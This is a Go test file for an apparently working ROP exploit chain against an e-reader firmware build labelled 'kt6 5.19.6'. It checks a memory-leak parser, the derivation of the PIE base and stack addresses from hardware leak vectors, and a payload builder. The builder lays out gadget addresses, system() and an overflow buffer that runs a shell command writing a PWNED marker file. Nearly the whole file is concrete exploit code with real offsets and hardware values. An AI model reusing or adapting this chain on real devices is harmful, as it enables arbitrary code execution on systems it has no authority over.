package chain

import (
	"encoding/binary"
	"encoding/hex"
	"testing"
)

func kt6Params() Params {
	return Params{
		System:       0x1fa01,
		PopGadget:    0x4bb1,
		LdrBlxGadget: 0x1ad03,
		GotBase:      0x2b000,
		StackDelta:   0xcd8,
		Slot4RawOff:  2,
		Slot16RawOff: 14,
		AnchorLow12:  0x8c0,
	}
}

// Vector from the hardware run on the kt6 5.19.6 build.
func TestLeakWordHardware(t *testing.T) {
	raw, err := hex.DecodeString("000000e0627f00000000083a02b4c0887fb0")
	if err != nil {
		t.Fatal(err)
	}
	pieWord, p16, ok := LeakWord(raw, 2, 14, 0x8c0)
	if !ok {
		t.Fatal("LeakWord rejected the hardware leak")
	}
	if pieWord != 0x7f62e000 || p16 != 0xb07f88c0 {
		t.Fatalf("LeakWord = %#x, %#x", pieWord, p16)
	}
	if _, _, ok := LeakWord(raw[:16], 2, 14, 0x8c0); ok {
		t.Fatal("short raw accepted")
	}
	bad := append([]byte(nil), raw...)
	bad[14] = 0xff
	if _, _, ok := LeakWord(bad, 2, 14, 0x8c0); ok {
		t.Fatal("anchor mismatch accepted")
	}
}

func TestSolveHardware(t *testing.T) {
	hit := Hit{PieWord: 0x7f62e000, P16: 0xb07f88c0}
	pie, s, err := Solve(hit, kt6Params())
	if err != nil {
		t.Fatalf("Solve: %v", err)
	}
	if pie != 0x7f603000 || s != 0xb07f7be8 {
		t.Fatalf("Solve = PIE %#x S %#x", pie, s)
	}
}

func TestBuildPayloadHardware(t *testing.T) {
	const cmd = "/usr/sbin/eips -c; touch /mnt/base-us/PWNED"
	pie, s := uint32(0x7f603000), uint32(0xb07f7be8)
	pl, err := BuildPayload(pie, s, kt6Params(), cmd)
	if err != nil {
		t.Fatalf("BuildPayload: %v", err)
	}
	if pl.N != 37 {
		t.Fatalf("N = %d, want 37", pl.N)
	}
	if pl.StrAddr != 0xb07f7c70 {
		t.Fatalf("StrAddr = %#x, want 0xb07f7c70", pl.StrAddr)
	}
	if len(pl.Filler) != 1024 || len(pl.Dummy) != 36 || len(pl.Overflow) != 36 {
		t.Fatalf("lengths: %d/%d/%d", len(pl.Filler), len(pl.Dummy), len(pl.Overflow))
	}
	dw := func(p []byte, off int) uint32 { return binary.LittleEndian.Uint32(p[off:]) }
	checks := []struct {
		off  int
		want uint32
	}{
		{0x4c, s + 0x54},
		{0x50, pie + 0x4bb1},
		{0x54, 0},
		{0x58, pie + 0x1fa01},
		{0x68, pie + 0x1ad03},
		{0x6c, pl.StrAddr},
	}
	for _, c := range checks {
		if got := dw(pl.Filler, c.off); got != c.want {
			t.Errorf("filler[%#x] = %#x, want %#x", c.off, got, c.want)
		}
	}
	if got := binary.LittleEndian.Uint32(pl.Filler[0:]); got != 1024 {
		t.Errorf("filler length header = %d", got)
	}
	if got := binary.LittleEndian.Uint32(pl.Overflow[32:]); got != pl.N {
		t.Errorf("overflow N = %d, want %d", got, pl.N)
	}
	if got := binary.LittleEndian.Uint32(pl.Dummy[32:]); got != 0x40 {
		t.Errorf("dummy phase marker = %#x, want 0x40", got)
	}
	if string(pl.Filler[0x74:0x74+len(cmd)]) != cmd || pl.Filler[0x74+len(cmd)] != 0 {
		t.Errorf("command string misplaced: %q", pl.Filler[0x74:0x74+len(cmd)+1])
	}
}

func TestBuildPayloadRejectsLongCommand(t *testing.T) {
	long := make([]byte, 1024)
	for i := range long {
		long[i] = 'A'
	}
	if _, err := BuildPayload(0x7f603000, 0xb07f7be8, kt6Params(), string(long)); err == nil {
		t.Fatal("oversized command accepted")
	}
}
